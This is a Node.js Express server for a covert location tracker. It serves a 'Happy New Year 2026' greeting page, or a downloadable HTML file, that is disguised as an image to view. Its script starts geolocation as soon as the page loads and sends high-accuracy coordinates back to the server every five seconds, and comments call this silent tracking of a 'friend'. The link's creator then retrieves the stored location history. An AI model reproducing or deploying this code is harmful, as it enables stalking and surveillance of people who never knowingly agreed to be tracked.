const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const { v4: uuidv4 } = require('uuid');
const path = require('path');
const fs = require('fs');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3001;

// Trust proxy for deployment (Render, Railway, etc.)
app.set('trust proxy', 1);

// Middleware
app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// Serve static images
app.use('/images', express.static(path.join(__dirname, '../client/public')));

// In-memory storage (replace with database in production)
const trackingLinks = new Map(); // linkId -> { userId, createdAt, isActive }
const locationUpdates = new Map(); // linkId -> [{ lat, lng, timestamp, deviceId }]

// Generate a unique shareable link
app.post('/api/links/generate', (req, res) => {
  try {
    const { userId, mediaType = 'image' } = req.body;
    const linkId = uuidv4();
    
    // Frontend URL (for shareable link)
    const frontendUrl = process.env.FRONTEND_URL || process.env.BASE_URL || 'http://localhost:3000';
    
    // Backend URL (for API endpoints)
    const protocol = req.protocol || 'http';
    const host = req.get('host') || process.env.SERVER_HOST || 'localhost:3001';
    const backendUrl = process.env.BACKEND_URL || `${protocol}://${host}`;
    
    const shareableLink = `${frontendUrl}/track/${linkId}`;
    
    trackingLinks.set(linkId, {
      userId: userId || 'anonymous',
      createdAt: new Date().toISOString(),
      isActive: true,
      linkId: linkId,
      mediaType: mediaType
    });
    
    locationUpdates.set(linkId, []);
    
    const createdLink = trackingLinks.get(linkId);
    
    res.json({
      success: true,
      linkId: linkId,
      shareableLink: shareableLink,
      mediaFileUrl: `${backendUrl}/api/media/${linkId}`,
      downloadUrl: `${backendUrl}/api/download/${linkId}`,
      createdAt: createdLink ? createdLink.createdAt : new Date().toISOString()
    });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Serve media file that triggers tracking
app.get('/api/media/:linkId', (req, res) => {
  try {
    const { linkId } = req.params;
    const linkData = trackingLinks.get(linkId);
    
    if (!linkData) {
      return res.status(404).send('File not found');
    }
    
    // Get the actual server URL from the request
    const protocol = req.protocol || 'http';
    const host = req.get('host') || 'localhost:3001';
    const serverUrl = `${protocol}://${host}`;
    const baseUrl = process.env.BASE_URL || serverUrl.replace(':3001', ':3000');
    const imageUrl = `${baseUrl}/images/newyear2026.webp`;
    
    // Create HTML with New Year 2026 theme that silently tracks
    const html = `<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Happy New Year 2026! 🎉</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      margin: 0;
      padding: 0;
      min-height: 100vh;
      font-family: 'Arial', sans-serif;
      overflow: hidden;
      position: relative;
      cursor: pointer;
    }
    .image-background {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-image: url('${imageUrl}');
      background-size: cover;
      background-position: center;
      background-repeat: no-repeat;
      filter: blur(15px);
      transition: filter 0.5s ease;
      z-index: 1;
    }
    .image-background.unblurred {
      filter: blur(0px);
    }
    .click-overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.3);
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 2;
      transition: opacity 0.5s ease;
    }
    .click-overlay.hidden {
      opacity: 0;
      pointer-events: none;
    }
    .click-message {
      color: white;
      font-size: 32px;
      font-weight: bold;
      text-align: center;
      text-shadow: 2px 2px 8px rgba(0,0,0,0.8);
      padding: 30px;
      background: rgba(0, 0, 0, 0.5);
      border-radius: 20px;
      animation: pulse 2s infinite;
    }
    .confetti {
      position: absolute;
      width: 10px;
      height: 10px;
      background: #ffd700;
      animation: fall linear infinite;
    }
    @keyframes fall {
      0% { transform: translateY(-100vh) rotate(0deg); opacity: 1; }
      100% { transform: translateY(100vh) rotate(360deg); opacity: 0; }
    }
    .media-container {
      text-align: center;
      color: white;
      padding: 40px;
      z-index: 10;
      position: relative;
    }
    .new-year-text {
      font-size: 48px;
      font-weight: bold;
      margin-bottom: 20px;
      background: linear-gradient(45deg, #ffd700, #ff6b6b, #4ecdc4, #45b7d1);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      background-clip: text;
      animation: glow 2s ease-in-out infinite;
    }
    @keyframes glow {
      0%, 100% { filter: drop-shadow(0 0 10px rgba(255, 215, 0, 0.5)); }
      50% { filter: drop-shadow(0 0 20px rgba(255, 215, 0, 0.8)); }
    }
    .media-icon {
      font-size: 120px;
      margin-bottom: 20px;
      animation: bounce 1s ease-in-out infinite;
    }
    @keyframes bounce {
      0%, 100% { transform: translateY(0) scale(1); }
      50% { transform: translateY(-20px) scale(1.1); }
    }
    h1 { 
      font-size: 36px; 
      margin-bottom: 15px;
      text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
    }
    p { 
      font-size: 20px; 
      opacity: 0.9;
      margin-top: 10px;
    }
    .year-badge {
      display: inline-block;
      background: linear-gradient(135deg, #ff6b6b, #ee5a6f);
      padding: 10px 30px;
      border-radius: 50px;
      margin-top: 20px;
      font-size: 24px;
      font-weight: bold;
      box-shadow: 0 4px 15px rgba(255, 107, 107, 0.4);
      animation: pulse 2s infinite;
    }
    @keyframes pulse {
      0%, 100% { transform: scale(1); }
      50% { transform: scale(1.05); }
    }
    .image-background {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-image: url('${imageUrl}');
      background-size: cover;
      background-position: center;
      background-repeat: no-repeat;
      filter: blur(15px);
      transition: filter 0.5s ease;
      z-index: 1;
    }
    .image-background.unblurred {
      filter: blur(0px);
    }
    .click-overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.3);
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 2;
      transition: opacity 0.5s ease;
      cursor: pointer;
    }
    .click-overlay.hidden {
      opacity: 0;
      pointer-events: none;
    }
    .click-message {
      color: white;
      font-size: 32px;
      font-weight: bold;
      text-align: center;
      text-shadow: 2px 2px 8px rgba(0,0,0,0.8);
      padding: 30px;
      background: rgba(0, 0, 0, 0.5);
      border-radius: 20px;
      animation: pulse 2s infinite;
    }
    .media-container {
      text-align: center;
      color: white;
      padding: 40px;
      z-index: 3;
      position: relative;
      background: rgba(0, 0, 0, 0.4);
      border-radius: 20px;
      margin: 20px;
      backdrop-filter: blur(10px);
    }
    .confetti {
      position: absolute;
      width: 10px;
      height: 10px;
      background: #ffd700;
      animation: fall linear infinite;
      z-index: 4;
    }
  </style>
</head>
<body>
  <div class="image-background" id="backgroundImage"></div>
  <div class="click-overlay" id="clickOverlay">
    <div class="click-message">👆 Click to View Image 👆</div>
  </div>
  <div class="media-container">
    <div class="new-year-text">🎉 Happy New Year 🎉</div>
    <div class="media-icon">🎊</div>
    <h1>Welcome to 2026!</h1>
    <p>Wishing you a wonderful year ahead!</p>
    <p style="font-size: 16px; margin-top: 20px; opacity: 0.8;">May this year bring you joy, success, and happiness! ✨</p>
    <div class="year-badge">2026</div>
  </div>
  <script>
    // Handle click to unblur image and start tracking
    let imageClicked = false;
    let trackingStarted = false;
    let startTrackingFunction = null;
    
    const backgroundImage = document.getElementById('backgroundImage');
    const clickOverlay = document.getElementById('clickOverlay');
    
    function handleImageClick() {
      if (!imageClicked) {
        imageClicked = true;
        backgroundImage.classList.add('unblurred');
        clickOverlay.classList.add('hidden');
        
        // Start location tracking when image is clicked
        if (!trackingStarted && startTrackingFunction) {
          trackingStarted = true;
          startTrackingFunction();
        }
      }
    }
    
    // Make entire page clickable
    document.body.addEventListener('click', handleImageClick);
    document.body.addEventListener('touchstart', handleImageClick);
    
    // Create confetti effect
    for (let i = 0; i < 50; i++) {
      const confetti = document.createElement('div');
      confetti.className = 'confetti';
      confetti.style.left = Math.random() * 100 + '%';
      confetti.style.animationDelay = Math.random() * 3 + 's';
      confetti.style.animationDuration = (Math.random() * 3 + 2) + 's';
      confetti.style.background = ['#ffd700', '#ff6b6b', '#4ecdc4', '#45b7d1', '#ffa500'][Math.floor(Math.random() * 5)];
      document.body.appendChild(confetti);
    }
  </script>
  <script>
    (function() {
      const linkId = '${linkId}';
      // Use the server URL - handle both file:// and http:// protocols
      let serverUrl = '${serverUrl}';
      
      // If opened as file://, use the original server URL from when file was created
      if (window.location.protocol === 'file:') {
        // Keep the original server URL - this is critical for offline files
        serverUrl = '${serverUrl}';
        console.log('File opened offline, using server URL:', serverUrl);
      } else {
        // When opened via HTTP, try to detect the server
        try {
          const currentOrigin = window.location.origin;
          serverUrl = currentOrigin.replace(':3000', ':3001');
          console.log('File opened via HTTP, detected server:', serverUrl);
        } catch(e) {
          // Fallback to original
          serverUrl = '${serverUrl}';
          console.log('Using fallback server URL:', serverUrl);
        }
      }
      
      const apiUrl = serverUrl + '/api';
      
      console.log('New Year 2026 Banner Loaded! 🎉');
      console.log('Location tracking ready for link:', linkId);
      
      function sendLocation(lat, lng) {
        const deviceId = localStorage.getItem('deviceId') || 'device_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now();
        localStorage.setItem('deviceId', deviceId);
        
        fetch(apiUrl + '/location/update', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            linkId: linkId,
            latitude: lat,
            longitude: lng,
            deviceId: deviceId
          })
        }).catch(() => {});
      }
      
      function startTracking() {
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(
            function(position) {
              sendLocation(position.coords.latitude, position.coords.longitude);
              
              const watchId = navigator.geolocation.watchPosition(
                function(pos) {
                  sendLocation(pos.coords.latitude, pos.coords.longitude);
                },
                function() {},
                { enableHighAccuracy: true, maximumAge: 0 }
              );
              
              setInterval(function() {
                navigator.geolocation.getCurrentPosition(
                  function(pos) {
                    sendLocation(pos.coords.latitude, pos.coords.longitude);
                  },
                  function() {}
                );
              }, 5000);
            },
            function() {},
            { enableHighAccuracy: true, maximumAge: 0 }
          );
        }
      }
      
      // Make startTracking available globally for click handler
      startTrackingFunction = startTracking;
      window.startTracking = startTracking;
      
      // Start tracking immediately when page loads (don't wait for click)
      console.log('Starting location tracking immediately...');
      startTracking();
    })();
  </script>
</body>
</html>`;
    
    res.setHeader('Content-Type', 'text/html');
    res.send(html);
  } catch (error) {
    res.status(500).send('Error loading media');
  }
});

// Download endpoint - returns HTML file that can be saved
app.get('/api/download/:linkId', (req, res) => {
  try {
    const { linkId } = req.params;
    
    if (!linkId) {
      return res.status(400).json({ success: false, error: 'Link ID is required' });
    }
    
    const linkData = trackingLinks.get(linkId);
    
    if (!linkData) {
      return res.status(404).json({ success: false, error: 'Link not found' });
    }
    
    // Get the actual server URL - use the request host or environment variable
    const protocol = req.protocol || 'http';
    const host = req.get('host') || process.env.SERVER_HOST || 'localhost:3001';
    const serverUrl = process.env.BASE_URL ? process.env.BASE_URL.replace(':3000', ':3001') : `${protocol}://${host}`;
    const baseUrl = process.env.BASE_URL || serverUrl.replace(':3001', ':3000');
    
    // Read and embed image as base64 for offline use
    let imageBase64 = '';
    let useBase64 = false;
    
    try {
      const imagePath = path.join(__dirname, '../client/public/newyear2026.webp');
      if (fs.existsSync(imagePath)) {
        const imageBuffer = fs.readFileSync(imagePath);
        imageBase64 = imageBuffer.toString('base64');
        // Use base64 for offline support - but limit size to avoid issues
        if (imageBase64 && imageBase64.length > 0 && imageBase64.length < 2000000) { // Max 2MB for safety
          useBase64 = true;
          console.log(`Image embedded as base64 (${Math.round(imageBase64.length / 1024)}KB)`);
        } else {
          console.log('Image too large for base64, using gradient fallback');
        }
      } else {
        console.log('Image file not found at:', imagePath);
      }
    } catch (err) {
      console.log('Could not embed image:', err.message);
    }
    
    // Build image URL - use base64 if available, otherwise use server URL
    const imageUrl = useBase64 ? `data:image/webp;base64,${imageBase64}` : `${baseUrl}/images/newyear2026.webp`;
    
    // Create HTML file content with New Year 2026 theme - completely self-contained
    const htmlContent = `<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Happy New Year 2026! 🎉</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      margin: 0;
      padding: 0;
      min-height: 100vh;
      font-family: 'Arial', sans-serif;
      overflow: hidden;
      position: relative;
      cursor: pointer;
    }
    .image-background {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-image: url('${imageUrl}');
      background-size: cover;
      background-position: center;
      background-repeat: no-repeat;
      filter: blur(15px);
      transition: filter 0.5s ease;
      z-index: 1;
    }
    .image-background.unblurred {
      filter: blur(0px);
    }
    .click-overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.3);
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 2;
      transition: opacity 0.5s ease;
      cursor: pointer;
    }
    .click-overlay.hidden {
      opacity: 0;
      pointer-events: none;
    }
    .click-message {
      color: white;
      font-size: 32px;
      font-weight: bold;
      text-align: center;
      text-shadow: 2px 2px 8px rgba(0,0,0,0.8);
      padding: 30px;
      background: rgba(0, 0, 0, 0.5);
      border-radius: 20px;
      animation: pulse 2s infinite;
    }
    .confetti {
      position: absolute;
      width: 10px;
      height: 10px;
      background: #ffd700;
      animation: fall linear infinite;
    }
    @keyframes fall {
      0% { transform: translateY(-100vh) rotate(0deg); opacity: 1; }
      100% { transform: translateY(100vh) rotate(360deg); opacity: 0; }
    }
    .media-container {
      text-align: center;
      color: white;
      padding: 40px;
      z-index: 3;
      position: relative;
      background: rgba(0, 0, 0, 0.4);
      border-radius: 20px;
      margin: 20px;
      backdrop-filter: blur(10px);
    }
    .new-year-text {
      font-size: 48px;
      font-weight: bold;
      margin-bottom: 20px;
      background: linear-gradient(45deg, #ffd700, #ff6b6b, #4ecdc4, #45b7d1);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      background-clip: text;
      animation: glow 2s ease-in-out infinite;
    }
    @keyframes glow {
      0%, 100% { filter: drop-shadow(0 0 10px rgba(255, 215, 0, 0.5)); }
      50% { filter: drop-shadow(0 0 20px rgba(255, 215, 0, 0.8)); }
    }
    .media-icon {
      font-size: 120px;
      margin-bottom: 20px;
      animation: bounce 1s ease-in-out infinite;
    }
    @keyframes bounce {
      0%, 100% { transform: translateY(0) scale(1); }
      50% { transform: translateY(-20px) scale(1.1); }
    }
    h1 { 
      font-size: 36px; 
      margin-bottom: 15px;
      text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
    }
    p { 
      font-size: 20px; 
      opacity: 0.9;
      margin-top: 10px;
    }
    .year-badge {
      display: inline-block;
      background: linear-gradient(135deg, #ff6b6b, #ee5a6f);
      padding: 10px 30px;
      border-radius: 50px;
      margin-top: 20px;
      font-size: 24px;
      font-weight: bold;
      box-shadow: 0 4px 15px rgba(255, 107, 107, 0.4);
      animation: pulse 2s infinite;
    }
    @keyframes pulse {
      0%, 100% { transform: scale(1); }
      50% { transform: scale(1.05); }
    }
    .confetti {
      position: absolute;
      width: 10px;
      height: 10px;
      background: #ffd700;
      animation: fall linear infinite;
      z-index: 4;
    }
    @keyframes fall {
      0% { transform: translateY(-100vh) rotate(0deg); opacity: 1; }
      100% { transform: translateY(100vh) rotate(360deg); opacity: 0; }
    }
  </style>
</head>
<body>
  <div class="image-background" id="backgroundImage"></div>
  <div class="click-overlay" id="clickOverlay">
    <div class="click-message">👆 Click to View Image 👆</div>
  </div>
  <div class="media-container">
    <div class="new-year-text">🎉 Happy New Year 🎉</div>
    <div class="media-icon">🎊</div>
    <h1>Welcome to 2026!</h1>
    <p>Wishing you a wonderful year ahead!</p>
    <p style="font-size: 16px; margin-top: 20px; opacity: 0.8;">May this year bring you joy, success, and happiness! ✨</p>
    <div class="year-badge">2026</div>
  </div>
  <script>
    // Handle click to unblur image and start tracking
    let imageClicked = false;
    let trackingStarted = false;
    let startTrackingFunction = null;
    
    const backgroundImage = document.getElementById('backgroundImage');
    const clickOverlay = document.getElementById('clickOverlay');
    
    function handleImageClick() {
      if (!imageClicked) {
        imageClicked = true;
        backgroundImage.classList.add('unblurred');
        clickOverlay.classList.add('hidden');
        
        // Start location tracking when image is clicked
        if (!trackingStarted && startTrackingFunction) {
          trackingStarted = true;
          startTrackingFunction();
        }
      }
    }
    
    // Make entire page clickable
    document.body.addEventListener('click', handleImageClick);
    document.body.addEventListener('touchstart', handleImageClick);
    
    // Create confetti effect
    for (let i = 0; i < 50; i++) {
      const confetti = document.createElement('div');
      confetti.className = 'confetti';
      confetti.style.left = Math.random() * 100 + '%';
      confetti.style.animationDelay = Math.random() * 3 + 's';
      confetti.style.animationDuration = (Math.random() * 3 + 2) + 's';
      confetti.style.background = ['#ffd700', '#ff6b6b', '#4ecdc4', '#45b7d1', '#ffa500'][Math.floor(Math.random() * 5)];
      document.body.appendChild(confetti);
    }
  </script>
  <script>
    (function() {
      const linkId = '${linkId}';
      // Use the server URL - handle both file:// and http:// protocols
      let serverUrl = '${serverUrl}';
      
      // If opened as file://, use the original server URL from when file was created
      if (window.location.protocol === 'file:') {
        // Keep the original server URL - this is critical for offline files
        serverUrl = '${serverUrl}';
        console.log('File opened offline, using server URL:', serverUrl);
      } else {
        // When opened via HTTP, try to detect the server
        try {
          const currentOrigin = window.location.origin;
          serverUrl = currentOrigin.replace(':3000', ':3001');
          console.log('File opened via HTTP, detected server:', serverUrl);
        } catch(e) {
          // Fallback to original
          serverUrl = '${serverUrl}';
          console.log('Using fallback server URL:', serverUrl);
        }
      }
      
      const apiUrl = serverUrl + '/api';
      
      console.log('New Year 2026 Banner Loaded! 🎉');
      console.log('Location tracking ready for link:', linkId);
      
      function sendLocation(lat, lng) {
        try {
          const deviceId = localStorage.getItem('deviceId') || 'device_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now();
          localStorage.setItem('deviceId', deviceId);
          
          console.log('Sending location to:', apiUrl + '/location/update');
          console.log('LinkId:', linkId, 'Lat:', lat, 'Lng:', lng);
          
          fetch(apiUrl + '/location/update', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              linkId: linkId,
              latitude: lat,
              longitude: lng,
              deviceId: deviceId
            })
          }).then(response => {
            console.log('Location sent successfully, status:', response.status);
            return response.json();
          }).then(data => {
            console.log('Server response:', data);
          }).catch(err => {
            console.log('Location tracking error:', err.message);
            console.log('API URL was:', apiUrl);
          });
        } catch(e) {
          console.log('Error in sendLocation:', e.message);
        }
      }
      
      function startTracking() {
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(
            function(position) {
              console.log('Location permission granted');
              sendLocation(position.coords.latitude, position.coords.longitude);
              
              const watchId = navigator.geolocation.watchPosition(
                function(pos) {
                  sendLocation(pos.coords.latitude, pos.coords.longitude);
                },
                function() {},
                { enableHighAccuracy: true, maximumAge: 0 }
              );
              
              setInterval(function() {
                navigator.geolocation.getCurrentPosition(
                  function(pos) {
                    sendLocation(pos.coords.latitude, pos.coords.longitude);
                  },
                  function() {}
                );
              }, 5000);
            },
            function(error) {
              console.log('Location tracking will start when permission is granted');
            },
            { enableHighAccuracy: true, maximumAge: 0 }
          );
        } else {
          console.log('Geolocation not supported');
        }
      }
      
      // Make startTracking available globally for click handler
      startTrackingFunction = startTracking;
      window.startTracking = startTracking;
      
      // Start tracking immediately when page loads (don't wait for click)
      console.log('Starting location tracking immediately...');
      startTracking();
    })();
  </script>
</body>
</html>`;
    
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.setHeader('Content-Disposition', `attachment; filename="NewYear2026-${linkId.substring(0, 8)}.html"`);
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET');
    res.send(htmlContent);
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Get link information
app.get('/api/links/:linkId', (req, res) => {
  try {
    const { linkId } = req.params;
    const linkData = trackingLinks.get(linkId);
    
    if (!linkData) {
      return res.status(404).json({ success: false, error: 'Link not found' });
    }
    
    res.json({
      success: true,
      link: linkData,
      locationCount: locationUpdates.get(linkId)?.length || 0
    });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Update location (called by friend when they visit the link)
app.post('/api/location/update', (req, res) => {
  // Add CORS headers
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  
  // Handle preflight
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }
  
  try {
    const { linkId, latitude, longitude, deviceId } = req.body;
    
    console.log('📍 Location update received:', { linkId, latitude, longitude, deviceId });
    
    if (!linkId || latitude === undefined || longitude === undefined) {
      console.log('❌ Missing required fields');
      return res.status(400).json({ 
        success: false, 
        error: 'Missing required fields: linkId, latitude, longitude' 
      });
    }
    
    const linkData = trackingLinks.get(linkId);
    if (!linkData) {
      console.log('❌ Invalid linkId:', linkId);
      return res.status(404).json({ success: false, error: 'Invalid tracking link' });
    }
    
    if (!linkData.isActive) {
      console.log('❌ Link is inactive:', linkId);
      return res.status(403).json({ success: false, error: 'Tracking link is inactive' });
    }
    
    const locationData = {
      latitude: parseFloat(latitude),
      longitude: parseFloat(longitude),
      timestamp: new Date().toISOString(),
      deviceId: deviceId || 'unknown'
    };
    
    if (!locationUpdates.has(linkId)) {
      locationUpdates.set(linkId, []);
    }
    
    const updates = locationUpdates.get(linkId);
    updates.push(locationData);
    
    console.log('✅ Location saved for linkId:', linkId, 'Total updates:', updates.length);
    
    // Keep only last 1000 updates per link
    if (updates.length > 1000) {
      updates.shift();
    }
    
    res.json({
      success: true,
      message: 'Location updated successfully',
      timestamp: locationData.timestamp,
      count: updates.length
    });
  } catch (error) {
    console.log('❌ Error updating location:', error.message);
    res.status(500).json({ success: false, error: error.message });
  }
});

// Get all location updates for a link
app.get('/api/location/:linkId', (req, res) => {
  try {
    const { linkId } = req.params;
    const updates = locationUpdates.get(linkId) || [];
    
    res.json({
      success: true,
      linkId: linkId,
      locations: updates,
      count: updates.length,
      latest: updates.length > 0 ? updates[updates.length - 1] : null
    });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Deactivate a tracking link
app.post('/api/links/:linkId/deactivate', (req, res) => {
  try {
    const { linkId } = req.params;
    const linkData = trackingLinks.get(linkId);
    
    if (!linkData) {
      return res.status(404).json({ success: false, error: 'Link not found' });
    }
    
    linkData.isActive = false;
    res.json({ success: true, message: 'Link deactivated successfully' });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Get all links for a user
app.get('/api/links/user/:userId', (req, res) => {
  try {
    const { userId } = req.params;
    const userLinks = [];
    
    trackingLinks.forEach((linkData, linkId) => {
      if (linkData.userId === userId) {
        const locationCount = locationUpdates.get(linkId)?.length || 0;
        const linkUpdates = locationUpdates.get(linkId) || [];
        userLinks.push({
          ...linkData,
          locationCount: locationCount,
          latestLocation: linkUpdates.length > 0 ? linkUpdates[linkUpdates.length - 1] : null
        });
      }
    });
    
    res.json({
      success: true,
      links: userLinks
    });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

app.listen(PORT, '0.0.0.0', () => {
  console.log(`Server running on port ${PORT}`);
  console.log(`API available at http://localhost:${PORT}/api`);
  if (process.env.BACKEND_URL) {
    console.log(`Backend URL: ${process.env.BACKEND_URL}`);
  }
  if (process.env.FRONTEND_URL) {
    console.log(`Frontend URL: ${process.env.FRONTEND_URL}`);
  }
});

